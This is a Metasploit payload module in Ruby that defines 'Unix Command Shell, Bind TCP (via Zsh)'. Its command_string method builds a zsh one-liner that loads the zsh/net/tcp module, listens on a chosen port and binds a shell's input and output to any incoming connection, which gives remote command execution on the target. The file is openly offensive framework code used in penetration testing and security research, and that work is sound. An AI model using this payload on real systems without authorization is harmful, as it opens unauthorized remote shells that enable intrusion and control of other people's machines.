##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 99

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
     'Name'          => 'Unix Command Shell, Bind TCP (via Zsh)',
     'Description'   => %q{
        Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is
        often available, please be aware it isn't usually installed by default.
      },
     'Author'        =>
       [
         'Doug Prostko <dougtko[at]gmail.com>',    # Initial payload
         'Wang Yihang <wangyihanger[at]gmail.com>' # Simplified redirections
       ],
     'License'       => MSF_LICENSE,
     'Platform'      => 'unix',
     'Arch'          => ARCH_CMD,
     'Handler'       => Msf::Handler::BindTcp,
     'Session'       => Msf::Sessions::CommandShell,
     'PayloadType'   => 'cmd',
     'RequiredCmd'   => 'zsh',
     'Payload'       =>
       {
         'Offsets' => { },
         'Payload' => ''
       }
    ))
    register_advanced_options(
      [
        OptString.new('ZSHPath', [true, 'The path to the ZSH executable', 'zsh'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    "#{datastore['ZSHPath']} -c 'zmodload zsh/net/tcp && ztcp -l #{datastore['LPORT']} && ztcp -a $REPLY && #{datastore['ZSHPath']} >&$REPLY 2>&$REPLY 0>&$REPLY'"
  end
end
